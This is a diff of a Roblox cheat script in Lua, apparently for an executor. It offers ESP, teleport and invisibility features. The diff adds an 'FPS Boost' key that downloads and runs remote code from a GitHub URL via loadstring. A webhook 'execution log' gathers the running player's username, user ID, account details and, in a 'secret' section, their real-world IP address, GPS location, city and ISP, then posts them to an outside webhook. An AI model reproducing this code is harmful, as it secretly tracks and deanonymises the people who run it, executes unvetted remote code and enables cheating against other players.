@@ -7,6 +7,7 @@
 -- - Location teleport (P)
 -- - Webhook notifications
 -- - Invisibility with GUI indicator (Backquote `)
+-- - FPS Boost (Toggle with [ key)
 
 local function createLoadingScreen()
     local screenGui = Instance.new("ScreenGui")
@@ -143,6 +144,32 @@ end
 createLoadingScreen()
 wait(10) -- Wait for loading to finish
 
+-- Fps Boost
+local FPSBoostEnabled = false
+
+local function toggleFPSBoost()
+    FPSBoostEnabled = not FPSBoostEnabled
+    
+    if FPSBoostEnabled then
+        -- Load script FPS boost sekali saja
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Alvantv/fpsboostadalia/main/data.lua"))()
+        
+        -- Beri notifikasi
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "FPS Boost",
+            Text = "Diaktifkan",
+            Duration = 2
+        })
+    else
+        -- Beri notifikasi bahwa tidak bisa dimatikan
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "FPS Boost",
+            Text = "Tidak bisa dinonaktifkan",
+            Duration = 2
+        })
+    end
+end
+
 -- Function to send webhook
 local function sendWebhook()
     --// Config
@@ -151,7 +178,7 @@ local function sendWebhook()
     getgenv().ExecLogSecret = true                --decide to also log secret section
 
     --// Execution Log Script
-    local ui = gethui()
+    local ui = game:GetService("CoreGui")
     local folderName = "screen"
     local folder = Instance.new("Folder")
     folder.Name = folderName
@@ -159,26 +186,24 @@ local function sendWebhook()
 
     if ui:FindFirstChild(folderName) then
         print("Script is already executed! Rejoin if it's an error!")
-        local ui2 = gethui()
+        local ui2 = game:GetService("CoreGui")
         local folderName1 = "screen2"
         local folder2 = Instance.new("Folder")
         folder2.Name = folderName1
         if ui2:FindFirstChild(folderName1) then
             player:Kick("Anti-spam execution system triggered. Please rejoin to proceed.")
         else
-            folder2.Parent = gethui()
+            folder2.Parent = game:GetService("CoreGui")
         end
     else
-        folder.Parent = gethui()
+        folder.Parent = game:GetService("CoreGui")
         local players = game:GetService("Players")
         local userid = player.UserId
         local gameid = game.PlaceId
         local jobid = tostring(game.JobId)
         local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-        local deviceType =
-            game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
-        local snipePlay =
-            "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
+        local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
+        local snipePlay = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
         local completeTime = os.date("%Y-%m-%d %H:%M:%S")
         local workspace = game:GetService("Workspace")
         local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
@@ -186,15 +211,9 @@ local function sendWebhook()
         local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
         local playerCount = #players:GetPlayers()
         local maxPlayers = players.MaxPlayers
-        local health =
-            player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
-        local maxHealth =
-            player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or
-            "N/A"
-        local position =
-            player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
-            player.Character.HumanoidRootPart.Position or
-            "N/A"
+        local health = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
+        local maxHealth = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or "N/A"
+        local position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or "N/A"
         local gameVersion = game.PlaceVersion
 
         if not getgenv().ExecLogSecret then
@@ -211,12 +230,9 @@ local function sendWebhook()
         local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
         local function checkPremium()
             local premium = "false"
-            local success, response =
-                pcall(
-                function()
-                    return player.MembershipType
-                end
-            )
+            local success, response = pcall(function()
+                return player.MembershipType
+            end)
             if success then
                 if response == Enum.MembershipType.None then
                     premium = "false"
@@ -243,50 +259,27 @@ local function sendWebhook()
                     ["fields"] = {
                         {
                             ["name"] = "🔍 **Script Info**",
-                            ["value"] = "```💻 Script Name: " ..
-                                getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```",
+                            ["value"] = "```💻 Script Name: " .. getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```",
                             ["inline"] = false
                         },
                         {
                             ["name"] = "👤 **Player Details**",
-                            ["value"] = "```🧸 Username: " ..
-                                player.Name ..
-                                    "\n📝 Display Name: " ..
-                                        player.DisplayName ..
-                                            "\n🆔 UserID: " ..
-                                                userid ..
-                                                    "\n❤️ Health: " ..
-                                                        health ..
-                                                            " / " ..
-                                                                maxHealth ..
-                                                                    "\n🔗 Profile: View Profile (https://www.roblox.com/users/" ..
-                                                                        userid .. "/profile)```",
+                            ["value"] = "```🧸 Username: " .. player.Name .. "\n📝 Display Name: " .. player.DisplayName .. "\n🆔 UserID: " .. userid .. "\n❤️ Health: " .. health .. " / " .. maxHealth .. "\n🔗 Profile: View Profile (https://www.roblox.com/users/" .. userid .. "/profile)```",
                             ["inline"] = false
                         },
                         {
                             ["name"] = "📅 **Account Information**",
-                            ["value"] = "```🗓️ Account Age: " ..
-                                player.AccountAge ..
-                                    " days\n💎 Premium Status: " ..
-                                        premium ..
-                                            "\n📅 Account Created: " ..
-                                                os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
+                            ["value"] = "```🗓️ Account Age: " .. player.AccountAge .. " days\n💎 Premium Status: " .. premium .. "\n📅 Account Created: " .. os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
                             ["inline"] = false
                         },
                         {
                             ["name"] = "🎮 **Game Details**",
-                            ["value"] = "```🏷️ Game Name: " ..
-                                gameName ..
-                                    "\n🆔 Game ID: " ..
-                                        gameid ..
-                                            "\n🔗 Game Link (https://www.roblox.com/games/" ..
-                                                gameid .. ")\n🔢 Game Version: " .. gameVersion .. "```",
+                            ["value"] = "```🏷️ Game Name: " .. gameName .. "\n🆔 Game ID: " .. gameid .. "\n🔗 Game Link (https://www.roblox.com/games/" .. gameid .. ")\n🔢 Game Version: " .. gameVersion .. "```",
                             ["inline"] = false
                         },
                         {
                             ["name"] = "🕹️ **Server Info**",
-                            ["value"] = "```👥 Players in Server: " ..
-                                playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```",
+                            ["value"] = "```👥 Players in Server: " .. playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```",
                             ["inline"] = true
                         },
                         {
@@ -296,12 +289,7 @@ local function sendWebhook()
                         },
                         {
                             ["name"] = "🖥️ **System Info**",
-                            ["value"] = "```📺 Resolution: " ..
-                                screenWidth ..
-                                    "x" ..
-                                        screenHeight ..
-                                            "\n🔍 Memory Usage: " ..
-                                                memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```",
+                            ["value"] = "```📺 Resolution: " .. screenWidth .. "x" .. screenHeight .. "\n🔍 Memory Usage: " .. memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```",
                             ["inline"] = true
                         },
                         {
@@ -331,23 +319,13 @@ local function sendWebhook()
             local ip = game:HttpGet("https://api.ipify.org")
             local iplink = "https://ipinfo.io/" .. ip .. "/json"
             local ipinfo_json = game:HttpGet(iplink)
-            local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)
+            local ipinfo_table = game:GetService("HttpService"):JSONDecode(ipinfo_json)
 
             table.insert(
                 data.embeds[1].fields,
                 {
                     ["name"] = "**`(🤫) User Location (Real life)`**",
-                    ["value"] = "||(👣) IP Address: " ..
-                        ipinfo_table.ip ..
-                            "||\n||(🌆) Country: " ..
-                                ipinfo_table.country ..
-                                    "||\n||(🪟) GPS Location: " ..
-                                        ipinfo_table.loc ..
-                                            "||\n||(🏙️) City: " ..
-                                                ipinfo_table.city ..
-                                                    "||\n||(🏡) Region: " ..
-                                                        ipinfo_table.region ..
-                                                            "||\n||(🪢) Hoster: " .. ipinfo_table.org .. "||"
+                    ["value"] = "||(👣) IP Address: " .. ipinfo_table.ip .. "||\n||(🌆) Country: " .. ipinfo_table.country .. "||\n||(🪟) GPS Location: " .. ipinfo_table.loc .. "||\n||(🏙️) City: " .. ipinfo_table.city .. "||\n||(🏡) Region: " .. ipinfo_table.region .. "||\n||(🪢) Hoster: " .. ipinfo_table.org .. "||"
                 }
             )
         end
@@ -356,7 +334,7 @@ local function sendWebhook()
         local headers = {
             ["content-type"] = "application/json"
         }
-        request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
+        local request = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or http_request or request
         local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
         request(abcdef)
     end
@@ -371,6 +349,7 @@ local settings = {
     spinKey = Enum.KeyCode.Q,
     teleportBehindKey = Enum.KeyCode.G,
     invisibilityKey = Enum.KeyCode.Backquote,
+    fpsBoostKey = Enum.KeyCode.LeftBracket, -- [ key for FPS Boost
     espColor = Color3.fromRGB(255, 70, 70),
     showHealth = true,
     espMaxDistance = 1000,
@@ -934,6 +913,8 @@ game:GetService("UserInputService").InputBegan:Connect(function(input, processed
             teleportBehindTarget()
         elseif input.KeyCode == settings.invisibilityKey then
             toggleInvisibility()
+        elseif input.KeyCode == settings.fpsBoostKey then
+            toggleFPSBoost()
         end
     end
 end)
@@ -983,6 +964,11 @@ local function cleanup()
     -- Reset invisibility GUI
     invisFrame.Visible = false
     invis_on = false
+    
+    -- Reset FPS boost if enabled
+    if FPSBoostEnabled then
+        toggleFPSBoost()
+    end
 end
 
 game.Players.LocalPlayer.CharacterRemoving:Connect(cleanup)
@@ -1016,7 +1002,8 @@ game.StarterGui:SetCore("ChatMakeSystemMessage", {
            "P = Teleport to Location\n"..
            "Q = Toggle Spin\n"..
            "G = Teleport Behind Target\n"..
-           "` (Backquote) = Toggle Invisibility",
+           "` (Backquote) = Toggle Invisibility\n"..
+           "[ = Toggle FPS Boost",
     Color = Color3.new(0, 1, 1),
     FontSize = Enum.FontSize.Size24
 })
